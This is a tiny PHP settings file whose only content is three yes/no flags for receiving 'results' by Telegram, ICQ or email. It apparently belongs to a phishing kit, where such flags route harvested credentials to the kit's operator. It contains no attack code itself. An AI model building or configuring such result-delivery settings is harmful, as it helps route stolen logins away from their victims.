<?php
ob_start();

$Telegram = 'no'; // Yes / No to receive telegram result
$ICQ = 'no'; // Yes / No to receive icq result
$Email = 'yes'; // Yes / No to receive Results via email

?> 
